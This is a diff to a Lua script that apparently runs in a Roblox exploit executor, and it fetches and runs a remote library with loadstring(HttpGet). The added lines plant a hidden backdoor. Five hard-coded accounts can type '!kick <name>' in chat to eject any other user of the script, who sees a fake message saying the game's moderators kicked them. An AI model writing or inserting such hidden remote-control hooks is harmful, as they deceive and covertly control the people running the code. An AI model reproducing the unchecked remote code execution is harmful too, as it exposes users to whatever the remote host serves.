@@ -9,6 +9,62 @@ local placeid = game.PlaceId
 local jobid = game.JobId
 local AllClipboards = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
 local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/main/Notification_Lib.lua"))()
+local Players = getgenv().Players or cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
+local TextChatService = cloneref and cloneref(game:GetService("TextChatService")) or game:GetService("TextChatService")
+local ReplicatedStorage = getgenv().ReplicatedStorage or cloneref and cloneref(game:GetService("ReplicatedStorage")) or game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer or getgenv().LocalPlayer or game.Players.LocalPlayer
+local allowed = {
+   ["L0CKED_1N1"] = true,
+   ["CHEATING_B0SS"] = true,
+   ["CleanestAuraEv3r"] = true,
+   ["Bobmcjoejoebob"] = true,
+   ["3xclusivekianna"] = true
+}
+
+local function create_bindable()
+   local existing = ReplicatedStorage:FindFirstChild("Bindable")
+   if existing then return existing end
+
+   local b = Instance.new("BindableEvent")
+   b.Name = "Bindable"
+   b.Parent = ReplicatedStorage
+   return b
+end
+
+local Bindable
+if not allowed[LocalPlayer.Name] then
+   Bindable = create_bindable()
+end
+
+TextChatService.MessageReceived:Connect(function(message)
+   local source = message.TextSource
+   if not source then return end
+
+   local sender = Players:GetPlayerByUserId(source.UserId)
+   if not sender or not allowed[sender.Name] then return end
+
+   local text = message.Text
+   if type(text) ~= "string" or text == "" then return end
+
+   local args = text:split(" ")
+   if args[1] ~= "!kick" or not args[2] then return end
+
+   local targetName = args[2]:lower()
+   local reason = table.concat(args, " ", 3)
+   if reason == "" then reason = "You've been kicked by an Administrator for Life Together RP." end
+
+   if Bindable then
+      if targetName == LocalPlayer.Name:lower() or targetName == LocalPlayer.DisplayName:lower() then
+         Bindable:Fire("This experience or its moderators have kicked you.")
+      end
+   end
+end)
+
+if Bindable then
+   Bindable.Event:Connect(function(reason)
+      LocalPlayer:Kick(tostring(reason))
+   end)
+end
 wait(0.1)
 function notify(notif_type, msg, duration)
    NotifyLib:External_Notification(tostring(notif_type), tostring(msg), tonumber(duration))
